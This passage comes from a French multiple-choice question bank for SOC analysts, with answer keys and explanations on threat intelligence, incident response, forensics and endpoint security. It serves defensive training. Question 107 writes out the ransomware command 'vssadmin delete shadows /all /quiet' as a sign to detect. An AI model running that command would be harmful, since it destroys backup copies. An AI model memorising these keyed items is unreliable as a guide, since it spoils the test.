- **D.** Aucune conclusion n'est possible : le certificat Let's Encrypt prouve la validation du domaine par une autorité, donc l'absence de risque immédiat.

**Réponse correcte : A**

> **Explication technique :** La date d'enregistrement récente (WHOIS), le typosquatting et la présence d'un certificat gratuit, qui n'est pas une garantie de légitimité, sont des signaux classiques de phishing ou de C2. L'analyste peut enrichir avec le passive DNS, urlscan.io et la réputation, puis bloquer et rechercher d'autres victimes.
>
> *Compétence évaluée : Threat Intelligence / Analyse de domaine.*

### Question 076 – [Niveau : Intermédiaire]

Pourquoi les analystes écrivent-ils les IOC sous la forme hxxps://malicious[.]com dans leurs rapports ?

- **A.** Pour indiquer que le domaine a été mis en sinkhole.
- **B.** Pour « désamorcer » les indicateurs et éviter un clic accidentel ou une résolution automatique par les outils.
- **C.** Pour signaler que l'indicateur a été vérifié par l'équipe CTI et qu'il peut être importé tel quel dans les outils de blocage.
- **D.** Pour respecter la norme STIX 2.1.

**Réponse correcte : B**

> **Explication technique :** Le defanging remplace http par hxxp et le point par [.] afin d'empêcher la création automatique de liens cliquables ou des requêtes involontaires par des clients de messagerie ou des aperçus. Les plateformes de CTI acceptent généralement le refanging automatique lors de l'import.
>
> *Compétence évaluée : Threat Intelligence / Defanging.*

### Question 077 – [Niveau : Intermédiaire]

Quels sont les quatre sommets du Diamond Model of Intrusion Analysis ?

- **A.** Reconnaissance, armement, livraison et exploitation.
- **B.** Identifier, protéger, détecter et répondre.
- **C.** Adversaire, capacité, infrastructure et victime.
- **D.** Confidentialité, intégrité, disponibilité et traçabilité.

**Réponse correcte : C**

> **Explication technique :** Le Diamond Model relie l'adversaire, ses capacités (malware, exploits), l'infrastructure utilisée (IP, domaines) et la victime. Il permet le « pivoting » : à partir d'une infrastructure connue, on peut découvrir d'autres victimes ou capacités du même adversaire.
>
> *Compétence évaluée : Threat Intelligence / Diamond Model.*

### Question 078 – [Niveau : Intermédiaire]

Un rapport de renseignement indique la cotation « B2 » selon le système Admiralty (NATO). Que signifie-t-elle ?

- **A.** La source est généralement fiable et l'information est probablement vraie.
- **B.** La fiabilité de la source ne peut être évaluée et l'information est fausse.
- **C.** La source est totalement fiable et l'information confirmée.
- **D.** La source est non fiable et l'information improbable.

**Réponse correcte : A**

> **Explication technique :** Le système Admiralty évalue séparément la fiabilité de la source (A complètement fiable à F non évaluable) et la crédibilité de l'information (1 confirmée à 6 non évaluable). B correspond à « généralement fiable » et 2 à « probablement vraie ». Ce système aide à pondérer les renseignements avant d'agir.
>
> *Compétence évaluée : Threat Intelligence / Évaluation des sources.*

### Question 079 – [Niveau : Intermédiaire]

Quel est l'intérêt principal d'une Threat Intelligence Platform (TIP) comme MISP ou OpenCTI pour un SOC ?

- **A.** Remplacer l'EDR sur les postes de travail.
- **B.** Centraliser, dédoublonner, contextualiser et partager les IOC et rapports, puis les pousser vers les outils de détection.
- **C.** Remplacer le SIEM en collectant directement les journaux des terminaux et en générant les alertes de corrélation.
- **D.** Collecter les journaux Windows de tous les serveurs.

**Réponse correcte : B**

> **Explication technique :** Une TIP agrège des flux multiples, corrèle les indicateurs, gère leur cycle de vie (score, expiration) et les relations avec les acteurs et campagnes. Elle alimente ensuite le SIEM, l'EDR ou le pare-feu via des API ou TAXII. Microsoft Sentinel, par exemple, peut importer les indicateurs dans la table ThreatIntelligenceIndicator.
>
> *Compétence évaluée : Threat Intelligence / Plateformes.*

### Question 080 – [Niveau : Intermédiaire]

Un SOC importe un flux gratuit de 500 000 adresses IP malveillantes et voit exploser le nombre d'alertes, majoritairement des faux positifs liés à des CDN. Quelle est la meilleure action ?

- **A.** Augmenter la sévérité de toutes les alertes issues du flux.
- **B.** Désactiver définitivement toute utilisation de threat intelligence.
- **C.** Bloquer l'ensemble des 500 000 adresses sur le pare-feu et conserver les alertes en sévérité maximale, car un flux réputé ne peut contenir de faux positifs.
- **D.** Évaluer la qualité du flux, appliquer un vieillissement (expiration) des indicateurs et exclure les plages d'infrastructures partagées comme les CDN.

**Réponse correcte : D**

> **Explication technique :** La qualité d'un flux se mesure à sa pertinence, sa fraîcheur, sa précision et son contexte. Les IP sont des indicateurs volatils, souvent partagées (CDN, hébergeurs, NAT). Un vieillissement automatique, un score de confiance et des listes d'exclusion sont indispensables pour limiter les faux positifs.
>
> *Compétence évaluée : Threat Intelligence / Qualité des flux.*

### Question 081 – [Niveau : Avancé / Expert]

En pivotant sur un domaine C2 via le passive DNS, un analyste découvre 15 autres domaines résolvant vers la même IP, partageant le même registrant et le même certificat TLS. Quelle approche est la plus rigoureuse ?

- **A.** Attribuer l'attaque à l'acteur étatique associé au registrant dans les rapports publics, puis diffuser cette attribution en TLP:CLEAR.
- **B.** Traiter ces éléments comme des pistes à valider par d'autres sources, sans attribution hâtive (hébergement mutualisé possible).
- **C.** Bloquer tout l'hébergeur concerné au niveau du pare-feu de façon permanente.
- **D.** Ignorer ces domaines, car seul le domaine initial est pertinent.

**Réponse correcte : B**

> **Explication technique :** Le pivoting est puissant mais sujet aux faux liens : hébergements mutualisés, certificats génériques, services de protection WHOIS. L'analyse doit croiser plusieurs sources et exprimer un niveau de confiance. L'attribution à un acteur exige des preuves solides et relève de l'analyse stratégique, pas d'une conclusion opérationnelle rapide.
>
> *Compétence évaluée : Threat Intelligence / Pivot et attribution.*

### Question 082 – [Niveau : Avancé / Expert]

Un rapport de CTI indique qu'un groupe ciblant votre secteur utilise rundll32.exe pour exécuter des DLL depuis C:\ProgramData et des tâches planifiées pour la persistance. Quelle exploitation est la plus efficace pour le SOC ?

- **A.** Archiver le rapport pour une lecture ultérieure.
- **B.** Bloquer immédiatement rundll32.exe et schtasks.exe sur l'ensemble du parc par AppLocker, sans phase d'audit préalable.
- **C.** Traduire ces TTP en chasses et en détections comportementales mappées sur ATT&CK, puis vérifier la couverture.
- **D.** Importer uniquement les hashs du rapport dans l'EDR.

**Réponse correcte : C**

> **Explication technique :** Les TTP sont la partie la plus durable du renseignement. Les convertir en détections (T1218.011 Rundll32, T1053.005 Scheduled Task) et en chasses permet de détecter l'adversaire même s'il change d'outils ou d'infrastructure. Bloquer un binaire système sans analyse peut casser des applications légitimes.
>
> *Compétence évaluée : Threat Intelligence / Intelligence-driven detection.*

### Question 083 – [Niveau : Avancé / Expert]

Une IP figure dans un flux CTI avec un score de confiance de 30/100, vue pour la dernière fois il y a 9 mois. Un serveur web a reçu une requête de cette IP. Quelle décision est la plus appropriée ?

- **A.** La traiter comme un signal faible à contextualiser (requête, réponse du serveur, activité ultérieure).
- **B.** Supprimer l'IP de tous les journaux.
- **C.** Déclarer immédiatement un incident majeur, isoler le serveur et bloquer l'IP, car toute IP listée dans un flux CTI prouve une attaque.
- **D.** Considérer que la présence dans un flux prouve la compromission du serveur.

**Réponse correcte : A**

> **Explication technique :** La valeur d'un indicateur diminue avec le temps et dépend de sa confiance. Une ancienne IP peut avoir été réattribuée. L'analyste doit examiner le comportement réel : requête bénigne ou tentative d'exploitation, code de réponse, activité post-requête. La CTI enrichit la décision, elle ne la remplace pas.
>
> *Compétence évaluée : Threat Intelligence / Indicateur de faible confiance.*

### Question 084 – [Niveau : Avancé / Expert]

Comment un SOC peut-il mesurer objectivement la valeur de son programme de threat intelligence ?

- **A.** En mesurant la taille de la base de données de la TIP.
- **B.** En comptant le nombre d'abonnements à des flux payants.
- **C.** En suivant le nombre total d'IOC importés chaque mois, le nombre de flux souscrits et la taille de la base de la TIP.
- **D.** En mesurant les détections attribuables à la CTI, leur taux de faux positifs et la couverture des TTP prioritaires.

**Réponse correcte : D**

> **Explication technique :** Le volume d'IOC n'est pas un indicateur de valeur. Les mesures pertinentes concernent l'impact opérationnel : détections générées, incidents évités ou accélérés, qualité des indicateurs, satisfaction des PIR et amélioration de la couverture de détection face aux adversaires pertinents.
>
> *Compétence évaluée : Threat Intelligence / Mesure de la CTI.*

### Question 085 – [Niveau : Avancé / Expert]

La CISA ajoute une CVE affectant votre VPN à son catalogue KEV (Known Exploited Vulnerabilities). Quelle est la réponse la plus appropriée du SOC ?

- **A.** Prioriser le correctif, chercher rétroactivement des traces d'exploitation dans les journaux VPN et renforcer la surveillance.
- **B.** Ignorer l'information si le VPN n'a déclenché aucune alerte.
- **C.** Attendre la publication d'une signature IDS par l'éditeur, puis l'appliquer, car l'équipement n'a déclenché aucune alerte jusqu'ici.
- **D.** Attendre que le score CVSS soit révisé avant d'agir.

**Réponse correcte : A**

> **Explication technique :** Le catalogue KEV recense des vulnérabilités activement exploitées : c'est un signal fort de priorisation, supérieur au seul score CVSS. Le SOC doit à la fois soutenir la remédiation et chasser des traces d'exploitation antérieure, car l'équipement a pu être compromis avant la publication.
>
> *Compétence évaluée : Threat Intelligence / Renseignement et vulnérabilités.*

## Module 5 – Incident Detection and Response

### Question 086 – [Niveau : Fondamental]

Selon le guide NIST SP 800-61 Rev. 2, quelles sont les quatre phases du cycle de réponse aux incidents ?

- **A.** Planification ; Exécution ; Contrôle ; Clôture.
- **B.** Préparation ; Détection et analyse ; Confinement, éradication et restauration ; Post-incident.
- **C.** Reconnaissance ; Exploitation ; Installation ; Exfiltration.
- **D.** Identification ; Protection ; Détection et analyse ; Réponse et récupération ; Gouvernance.

**Réponse correcte : B**

> **Explication technique :** Le NIST SP 800-61 Rev. 2 définit ces quatre phases, avec des boucles entre la détection et le confinement. La Rev. 3 (2025) réaligne la réponse aux incidents sur les fonctions du NIST CSF 2.0, mais le modèle en quatre phases reste la référence pédagogique la plus utilisée, notamment dans les supports de certification.
>
> *Compétence évaluée : Incident Response / NIST SP 800-61.*

### Question 087 – [Niveau : Fondamental]

Quelle activité appartient à la phase de préparation ?

- **A.** Isoler un poste infecté du réseau.
- **B.** Supprimer un malware d'un serveur.
- **C.** Rédiger les playbooks, constituer la trousse d'intervention et former l'équipe de réponse.
- **D.** Restaurer les données d'un serveur depuis une sauvegarde saine après un incident de chiffrement.

**Réponse correcte : C**

> **Explication technique :** La préparation regroupe tout ce qui est mis en place avant un incident : politique de réponse, rôles, contacts, outils, playbooks, exercices, sauvegardes et durcissement. Les autres actions citées relèvent du confinement, de l'éradication et de la restauration.
>
> *Compétence évaluée : Incident Response / Préparation.*

### Question 088 – [Niveau : Fondamental]

Quel est l'objectif principal de la phase de confinement ?

- **A.** Communiquer l'incident à la presse.
- **B.** Restaurer tous les systèmes à partir des sauvegardes.
- **C.** Identifier la cause racine de l'incident et rédiger le rapport final destiné à la direction.
- **D.** Limiter la propagation et l'impact de l'incident tout en préservant les preuves.

**Réponse correcte : D**

> **Explication technique :** Le confinement vise à arrêter l'extension des dégâts : isolement réseau d'un hôte, blocage d'IP, désactivation de comptes. Il doit être réalisé de manière à préserver les preuves (par exemple, isoler via l'EDR plutôt qu'éteindre une machine dont la mémoire contient des artefacts).
>
> *Compétence évaluée : Incident Response / Confinement.*

### Question 089 – [Niveau : Fondamental]

Quelle action correspond à la phase d'éradication ?

- **A.** Supprimer les malwares, la persistance et les comptes créés par l'attaquant.
- **B.** Remettre en production un serveur après validation et surveillance renforcée.
- **C.** Déconnecter le câble réseau du poste compromis.
- **D.** Organiser la réunion de retour d'expérience.

**Réponse correcte : A**

> **Explication technique :** L'éradication élimine la présence de l'attaquant : malwares, tâches planifiées, services, clés de registre, comptes illégitimes, web shells, et correction de la vulnérabilité exploitée. Une éradication incomplète conduit fréquemment à une réinfection.
>
> *Compétence évaluée : Incident Response / Éradication.*

### Question 090 – [Niveau : Fondamental]

Quel est l'objectif de la réunion de retour d'expérience (lessons learned) après un incident ?

- **A.** Désigner le responsable de l'incident et définir les mesures disciplinaires applicables.
- **B.** Identifier les axes d'amélioration et mettre à jour processus, détections et contrôles.
- **C.** Clore le ticket sans documentation.
- **D.** Supprimer les preuves collectées.

**Réponse correcte : B**

> **Explication technique :** Le retour d'expérience, idéalement « blameless », vise l'amélioration continue : lacunes de détection, délais, communication, outillage. Ses conclusions alimentent les playbooks, les règles SIEM, la formation et la gestion des risques.
>
> *Compétence évaluée : Incident Response / Lessons learned.*

### Question 091 – [Niveau : Fondamental]

Pourquoi la chaîne de possession (chain of custody) est-elle essentielle lors de la collecte de preuves ?

- **A.** Elle accélère la copie des disques durs.
- **B.** Elle remplace le calcul des empreintes cryptographiques, en garantissant à elle seule l'intégrité technique du support.
- **C.** Elle permet de chiffrer automatiquement les preuves.
- **D.** Elle documente qui a manipulé la preuve, quand et comment, afin de garantir son intégrité et sa recevabilité.

**Réponse correcte : D**

> **Explication technique :** La chaîne de possession trace chaque transfert et manipulation d'une preuve (date, heure, personne, motif). Associée au calcul d'empreintes (SHA-256) à l'acquisition et à chaque vérification, elle démontre que la preuve n'a pas été altérée, ce qui est indispensable en cas de procédure judiciaire.
>
> *Compétence évaluée : Incident Response / Chaîne de possession.*

### Question 092 – [Niveau : Fondamental]

Lors du triage d'une alerte, quelle est la première question que l'analyste doit trancher ?

- **A.** Combien d'employés travaillent dans le service concerné ?
- **B.** La règle SIEM qui a déclenché l'alerte est-elle mappée sur une technique MITRE ATT&CK et documentée ?
- **C.** S'agit-il d'un vrai positif (activité malveillante) ou d'un faux positif (activité légitime) ?
- **D.** Quel est le budget nécessaire pour remplacer le poste ?

**Réponse correcte : C**

> **Explication technique :** Le triage consiste à valider ou infirmer l'alerte, puis à évaluer sa sévérité et son urgence pour décider de la suite : clôture documentée, escalade ou déclenchement de la réponse. Une qualification rigoureuse évite à la fois le gaspillage de ressources et l'ignorance d'une vraie menace.
>
> *Compétence évaluée : Incident Response / Triage.*

### Question 093 – [Niveau : Intermédiaire]

Trois alertes arrivent simultanément. Laquelle doit être traitée en priorité ?

- **A.** Une exécution de Mimikatz détectée sur un contrôleur de domaine.
- **B.** Un scan de ports externe bloqué par le pare-feu périmétrique.
- **C.** Un échec de connexion unique sur un poste de test.
- **D.** Une alerte de mise à jour de signature antivirus.

**Réponse correcte : A**

> **Explication technique :** La priorisation combine la sévérité de la menace et la criticité de l'actif. Un outil de vol d'identifiants sur un contrôleur de domaine indique une compromission potentielle de tout l'Active Directory : impact maximal. Les scans bloqués sont fréquents et à faible risque.
>
> *Compétence évaluée : Incident Response / Priorisation.*

### Question 094 – [Niveau : Intermédiaire]

Selon la RFC 3227, dans quel ordre collecter les preuves sur un système compromis encore allumé ?

- **A.** Sauvegardes d'abord, puis disque, puis mémoire vive.
- **B.** Mémoire, processus et connexions réseau, puis fichiers temporaires, disque, journaux distants et archives.
- **C.** Peu importe l'ordre, car toutes les preuves ont la même durée de vie.
- **D.** Image du disque dur d'abord, car elle est la plus complète, puis mémoire vive, connexions réseau et journaux distants.

**Réponse correcte : B**

> **Explication technique :** La RFC 3227 recommande de collecter du plus volatil au moins volatil : registres et cache, table de routage, cache ARP, table des processus et mémoire, fichiers temporaires, disque, journaux distants, configuration physique et médias d'archivage. La mémoire peut contenir des clés, des processus injectés et des connexions disparaissant à l'arrêt.
>
> *Compétence évaluée : Incident Response / Ordre de volatilité.*

### Question 095 – [Niveau : Intermédiaire]

Un poste exécute un ransomware en cours de chiffrement. L'EDR est CrowdStrike Falcon. Quelle action de confinement est la plus appropriée ?

- **A.** Arrêter le poste à distance via la console Falcon, puis le redémarrer en mode sans échec pour lancer une analyse complète.
- **B.** Éteindre immédiatement tous les serveurs de l'entreprise.
- **C.** Attendre la fin du chiffrement pour analyser le malware.
- **D.** Utiliser la fonction « Network Contain » pour isoler l'hôte tout en conservant la communication avec la console Falcon.

**Réponse correcte : D**

> **Explication technique :** L'isolation réseau via l'EDR (Network Contain dans Falcon, « Isolate device » dans Defender for Endpoint) coupe les communications, sauf vers la console, ce qui stoppe la propagation tout en permettant l'investigation à distance (Real Time Response) et la préservation de la mémoire.
>
> *Compétence évaluée : Incident Response / Isolement EDR.*

### Question 096 – [Niveau : Intermédiaire]

Selon la matrice d'escalade, quand un analyste Tier 1 doit-il escalader un incident ?

- **A.** Uniquement après avoir terminé lui-même l'investigation complète et l'éradication, afin de ne transmettre que des incidents résolus.
- **B.** Jamais : le Tier 1 doit résoudre seul tous les incidents.
- **C.** Lorsque l'incident dépasse son périmètre de compétence ou d'autorité, ou qu'il atteint un critère de sévérité défini dans la procédure.
- **D.** Seulement si l'utilisateur concerné le demande.

**Réponse correcte : C**

> **Explication technique :** La matrice d'escalade définit les critères (sévérité, type d'actif, données sensibles, VIP), les interlocuteurs et les délais. Elle garantit une prise en charge au bon niveau et dans les temps. Une escalade tardive allonge le MTTR et augmente l'impact.
>
> *Compétence évaluée : Incident Response / Escalade.*

### Question 097 – [Niveau : Intermédiaire]

Un utilisateur signale un e-mail suspect. Quelle première analyse est la plus pertinente ?

- **A.** Supprimer l'e-mail sans analyse.
- **B.** Cliquer sur le lien pour vérifier s'il fonctionne.
- **C.** Examiner les en-têtes (Received, SPF, DKIM, DMARC), puis les URL et pièces jointes en environnement isolé.
- **D.** Ouvrir la pièce jointe sur son poste d'analyste protégé par l'EDR et transférer l'e-mail aux employés pour les sensibiliser.

**Réponse correcte : C**

> **Explication technique :** L'analyse des en-têtes révèle l'origine réelle et l'usurpation éventuelle. Les URL et pièces jointes sont analysées par réputation et en sandbox. Ensuite, l'analyste recherche les autres destinataires (ex. via la table EmailEvents dans Defender XDR) et vérifie si quelqu'un a cliqué ou saisi ses identifiants.
>
> *Compétence évaluée : Incident Response / Analyse d'alerte phishing.*

### Question 098 – [Niveau : Intermédiaire]

Après confirmation d'un malware sur un poste, quelle étape permet de déterminer le périmètre de l'incident ?

- **A.** Rechercher les IOC et comportements observés sur tout le parc via le SIEM et l'EDR.
- **B.** Changer le mot de passe de l'administrateur du SIEM.
- **C.** Restaurer le poste sans investigation complémentaire.
- **D.** Nettoyer le poste concerné avec l'antivirus, réinitialiser le mot de passe de l'utilisateur et clore l'incident.

**Réponse correcte : A**

> **Explication technique :** Le scoping consiste à identifier tous les systèmes et comptes affectés. Les IOC et TTP du premier hôte servent de pivots pour une recherche globale. Remédier sans scoping laisse souvent l'attaquant présent sur d'autres machines.
>
> *Compétence évaluée : Incident Response / Périmètre d'incident.*

### Question 099 – [Niveau : Intermédiaire]

Dans Microsoft Defender XDR, quel est l'intérêt de la vue « Incident » par rapport à une alerte isolée ?

- **A.** Elle remplace la nécessité d'investigation humaine.
- **B.** Elle regroupe les alertes liées de plusieurs produits (endpoint, identité, messagerie) en une seule attaque.
- **C.** Elle classe les alertes par produit (endpoint, identité, messagerie) dans des files distinctes afin que chaque équipe les traite séparément.
- **D.** Elle supprime automatiquement les alertes de faible sévérité.

**Réponse correcte : B**

> **Explication technique :** Defender XDR corrèle les alertes issues de Defender for Endpoint, for Identity, for Office 365 et for Cloud Apps en incidents. L'analyste dispose d'un graphe d'attaque, des entités impliquées et des preuves, ce qui accélère la compréhension du scénario complet.
>
> *Compétence évaluée : Incident Response / Defender XDR.*

### Question 100 – [Niveau : Intermédiaire]

Quelles informations doivent figurer dans un ticket d'incident bien documenté ?

- **A.** Uniquement le nom de l'analyste et le statut « clos ».
- **B.** Une capture d'écran de la console sans explication.
- **C.** Le nombre d'alertes traitées pendant le poste, le nom de l'analyste et le statut final, sans détail des actions.
- **D.** Chronologie, sources consultées, indicateurs, actifs impactés, actions, décisions et justifications.

**Réponse correcte : D**

> **Explication technique :** Une documentation complète permet la continuité entre analystes, l'escalade, la conformité, l'éventuelle action judiciaire et le retour d'expérience. La justification des décisions est particulièrement importante lors de la clôture d'un faux positif.
>
> *Compétence évaluée : Incident Response / Documentation.*

### Question 101 – [Niveau : Intermédiaire]

Un incident confirmé implique la fuite de données personnelles de clients européens. Quelle obligation réglementaire le SOC doit-il signaler à la gouvernance ?

- **A.** Aucune obligation, car l'incident est technique.
- **B.** Une notification aux personnes concernées sous 30 jours ouvrés, uniquement si les données étaient chiffrées et que la clé a été compromise.
- **C.** Une notification uniquement si la presse en parle.
- **D.** Une notification à l'autorité de contrôle sous 72 heures (RGPD), sauf risque improbable pour les personnes.

**Réponse correcte : D**

> **Explication technique :** L'article 33 du RGPD impose de notifier une violation de données personnelles à l'autorité de contrôle (la CNIL en France) dans les 72 heures, sauf si elle est peu susceptible d'engendrer un risque. Le SOC fournit les faits ; la décision et la notification relèvent du DPO et de la direction.
>
> *Compétence évaluée : Incident Response / Notification réglementaire.*

### Question 102 – [Niveau : Intermédiaire]

Lors de la phase de restauration, quelle précaution est indispensable avant de remettre un serveur en production ?

- **A.** Vérifier que la sauvegarde est saine et antérieure à la compromission, corriger, puis surveiller de près.
- **B.** Désactiver la journalisation pour améliorer les performances.
- **C.** Restaurer la sauvegarde la plus récente afin de minimiser la perte de données, puis réactiver immédiatement les accès des utilisateurs.
- **D.** Remettre le serveur en production sans changer les identifiants compromis.

**Réponse correcte : A**

> **Explication technique :** Une restauration à partir d'une sauvegarde contenant déjà la porte dérobée réintroduit l'attaquant. Il faut identifier la date de compromission initiale, restaurer un état sain, corriger la vulnérabilité, réinitialiser les identifiants et surveiller attentivement le système.
>
> *Compétence évaluée : Incident Response / Restauration.*

### Question 103 – [Niveau : Intermédiaire]

Un analyste dispose d'un dump mémoire d'un poste Windows. Quel plugin Volatility 3 permet de repérer des régions mémoire injectées potentiellement malveillantes ?

- **A.** windows.info.
- **B.** windows.malfind.
- **C.** windows.pslist uniquement.
- **D.** windows.envars.

**Réponse correcte : B**

> **Explication technique :** windows.malfind identifie les zones mémoire exécutables et inscriptibles (PAGE_EXECUTE_READWRITE) non associées à un fichier sur disque, ce qui est typique de l'injection de code. windows.pslist liste les processus, windows.pstree leur hiérarchie et windows.netscan les connexions réseau.
>
> *Compétence évaluée : Digital Forensics / Analyse mémoire.*

### Question 104 – [Niveau : Avancé / Expert]

Un serveur de production critique (ERP) présente une connexion C2 active. La direction refuse l'arrêt du serveur en période de clôture comptable. Quelle stratégie est la plus appropriée ?

- **A.** Éteindre le serveur malgré le refus de la direction, car le SOC dispose toujours de l'autorité finale pour arrêter un actif compromis, quel que soit l'impact.
- **B.** Supprimer immédiatement l'application ERP du serveur.
- **C.** Un confinement ciblé (blocage du C2, flux sortants restreints, comptes désactivés) et une décision de risque documentée.
- **D.** Ignorer l'alerte jusqu'à la fin de la clôture comptable.

**Réponse correcte : C**

> **Explication technique :** Le confinement doit être proportionné à l'impact métier. Des mesures ciblées réduisent le risque tout en maintenant le service. La décision d'acceptation du risque appartient à la direction et doit être tracée. Le SOC conseille et documente, il ne décide pas seul d'arrêts majeurs, sauf procédure d'urgence prévue.
>
> *Compétence évaluée : Incident Response / Arbitrage confinement.*

### Question 105 – [Niveau : Avancé / Expert]

Lors d'une intrusion avancée (APT) en cours, pourquoi l'équipe de réponse peut-elle choisir de différer les actions de confinement visibles ?

- **A.** Parce que le confinement n'est jamais utile face à une APT.
- **B.** Pour laisser l'attaquant terminer l'exfiltration, afin d'identifier précisément les données volées avant de couper ses accès et de notifier les autorités.
- **C.** Pour cartographier toute la compromission et évincer l'attaquant en une fois, sans le pousser à réagir.
- **D.** Pour éviter de devoir rédiger un rapport d'incident.

**Réponse correcte : C**

> **Explication technique :** Face à un adversaire sophistiqué, un confinement partiel et précipité peut l'alerter : il active alors des portes dérobées secondaires ou détruit des preuves. La stratégie consiste à observer discrètement, identifier tous les points d'ancrage, puis exécuter une éviction coordonnée. Cette décision implique un arbitrage de risque validé par la direction.
>
> *Compétence évaluée : Incident Response / Ne pas alerter l'attaquant.*

### Question 106 – [Niveau : Avancé / Expert]

Pour reconstituer l'activité d'un attaquant sur un poste Windows, quelle combinaison d'artefacts permet de prouver l'exécution d'un programme ?

- **A.** Uniquement l'historique du navigateur web.
- **B.** Prefetch, Amcache, ShimCache, événements 4688/Sysmon 1 et UserAssist.
- **C.** Les journaux DHCP, l'historique des connexions VPN et la liste des imprimantes installées par l'utilisateur.
- **D.** Uniquement la date de modification du fichier exécutable.

**Réponse correcte : B**

> **Explication technique :** Les fichiers Prefetch (C:\Windows\Prefetch) indiquent les exécutions et leur nombre, l'Amcache conserve des métadonnées et hashs, le ShimCache des traces de compatibilité, UserAssist les programmes lancés via l'interface graphique. Croiser ces artefacts avec les journaux renforce la fiabilité de la timeline. Les horodatages de fichiers peuvent être falsifiés (timestomping).
>
> *Compétence évaluée : Digital Forensics / Timeline.*

### Question 107 – [Niveau : Avancé / Expert]

Un SOC détecte, sur un serveur, la commande vssadmin delete shadows /all /quiet suivie de nombreuses modifications de fichiers avec une nouvelle extension. Quelle séquence de réponse est la plus adaptée ?

- **A.** Payer immédiatement la rançon pour récupérer les fichiers.
- **B.** Redémarrer le serveur en mode sans échec, restaurer les clichés instantanés depuis le serveur lui-même, puis le reconnecter au réseau pour reprendre l'activité.
- **C.** Redémarrer le serveur pour arrêter le processus.
- **D.** Isoler l'hôte via l'EDR, identifier compte et vecteur, chasser sur le parc, protéger les sauvegardes, activer la crise.

**Réponse correcte : D**

> **Explication technique :** La suppression des clichés instantanés (T1490 – Inhibit System Recovery) précède souvent le chiffrement (T1486). Le confinement rapide limite la propagation ; l'identification du compte et du vecteur permet de bloquer l'attaquant ; la protection des sauvegardes hors ligne ou immuables est vitale. Le redémarrage peut détruire des preuves en mémoire sans nécessairement arrêter la propagation.
>
> *Compétence évaluée : Incident Response / Ransomware.*

### Question 108 – [Niveau : Avancé / Expert]

Un poste compromis se trouve dans une filiale à l'étranger, sans intervenant sur place. Quelle approche permet une collecte forensique rapide et fiable ?

- **A.** Collecter mémoire et artefacts à distance (Live Response, KAPE, Velociraptor), avec hashs et documentation.
- **B.** Attendre le déplacement d'un analyste sur site plusieurs semaines plus tard.
- **C.** Demander à l'utilisateur de copier ses fichiers et journaux sur une clé USB et de l'envoyer par courrier, puis réinstaller le poste pour éliminer la menace sans délai.
- **D.** Réinstaller le poste à distance pour éliminer la menace.

**Réponse correcte : A**

> **Explication technique :** Les outils de collecte à distance permettent de récupérer rapidement les artefacts volatils et non volatils de manière reproductible. La documentation (commandes, horodatages, hashs) maintient l'intégrité de la preuve. Attendre ou réinstaller entraînerait la perte de preuves cruciales.
>
> *Compétence évaluée : Digital Forensics / Acquisition à distance.*

### Question 109 – [Niveau : Avancé / Expert]

L'investigation révèle que l'attaquant a obtenu le hash du compte KRBTGT. Quelle mesure d'éradication est indispensable ?

- **A.** Redémarrer les contrôleurs de domaine sans autre action.
- **B.** Réinitialiser le mot de passe de l'utilisateur initialement compromis et de tous les administrateurs du domaine, ce qui invalide automatiquement les tickets forgés.
- **C.** Réinitialiser deux fois le mot de passe du compte KRBTGT, en respectant un délai de réplication entre les deux, pour invalider les Golden Tickets.
- **D.** Supprimer le compte KRBTGT de l'annuaire.

**Réponse correcte : C**

> **Explication technique :** Avec le hash KRBTGT, un attaquant peut forger des Golden Tickets (T1558.001) valides pour n'importe quel compte. Comme l'AD conserve l'ancien et le nouveau mot de passe, une double réinitialisation espacée est nécessaire pour invalider les tickets forgés. Le compte KRBTGT ne doit jamais être supprimé.
>
> *Compétence évaluée : Incident Response / Comptes compromis AD.*

### Question 110 – [Niveau : Avancé / Expert]

Pendant un incident majeur, quelle pratique de communication est recommandée ?

- **A.** Utiliser un canal de communication hors bande (out-of-band), indépendant de l'infrastructure potentiellement compromise.
- **B.** Publier les détails techniques de l'incident sur les réseaux sociaux en temps réel.
- **C.** Informer l'attaquant des mesures prises pour négocier.
- **D.** Communiquer exclusivement via la messagerie interne chiffrée de l'entreprise, afin de garder une trace centralisée des échanges.

**Réponse correcte : A**

> **Explication technique :** Si la messagerie ou l'annuaire est compromis, l'attaquant peut lire les échanges de l'équipe de réponse. Un canal hors bande (téléphones dédiés, messagerie sécurisée externe préparée en amont) protège la confidentialité de la réponse. Ce canal doit être prévu dans la phase de préparation.
>
> *Compétence évaluée : Incident Response / Communication de crise.*

## Module 6 – Endpoint Security and Malware Analysis

### Question 111 – [Niveau : Fondamental]

Quelle caractéristique définit un ransomware ?

- **A.** Il se limite à afficher des publicités indésirables.
- **B.** Il chiffre ou bloque l'accès aux données et exige une rançon pour leur restitution.
- **C.** Il se propage automatiquement de poste en poste en exploitant des vulnérabilités réseau, sans jamais toucher aux données.
- **D.** Il améliore les performances du système infecté.

**Réponse correcte : B**

> **Explication technique :** Le ransomware chiffre les fichiers ou bloque le système (T1486). Les groupes modernes pratiquent la double extorsion : exfiltration des données avant chiffrement, puis menace de publication. Les adwares affichent des publicités et les keyloggers capturent les frappes.
>
> *Compétence évaluée : Endpoint Security / Ransomware.*

### Question 112 – [Niveau : Fondamental]

Quel Event ID Windows indique qu'un journal d'audit de sécurité a été effacé ?

- **A.** 4624.
- **B.** 4720.
- **C.** 4688.
- **D.** 1102.

**Réponse correcte : D**

> **Explication technique :** L'Event ID 1102 (« The audit log was cleared ») est généré dans le journal Security. Son effacement est un indicateur classique d'anti-forensic (T1070.001). Les autres IDs correspondent à une ouverture de session réussie (4624), une création de compte (4720) et une création de processus (4688). L'effacement du journal System génère quant à lui l'événement 104.
>
> *Compétence évaluée : Endpoint Security / Événements Windows.*

### Question 113 – [Niveau : Fondamental]

Quel Event ID Sysmon correspond à la création d'un processus ?

- **A.** 1.
- **B.** 22.
- **C.** 11.
- **D.** 3.

**Réponse correcte : A**

> **Explication technique :** Sysmon Event ID 1 (Process Create) fournit l'image, la ligne de commande, le processus parent, l'utilisateur et les hashs. L'ID 3 correspond aux connexions réseau, l'ID 11 à la création de fichiers et l'ID 22 aux requêtes DNS. Sysmon doit être déployé avec une configuration adaptée, comme celles de SwiftOnSecurity ou d'Olaf Hartong.
>
> *Compétence évaluée : Endpoint Security / Sysmon.*

### Question 114 – [Niveau : Fondamental]

Quelle capacité distingue un EDR d'un antivirus traditionnel ?

- **A.** Le fonctionnement uniquement hors ligne.
- **B.** L'enregistrement continu de la télémétrie des terminaux, la détection comportementale et les capacités d'investigation et de réponse à distance.
- **C.** Une base de signatures de fichiers plus volumineuse et mise à jour plusieurs fois par heure, sans collecte de télémétrie comportementale.
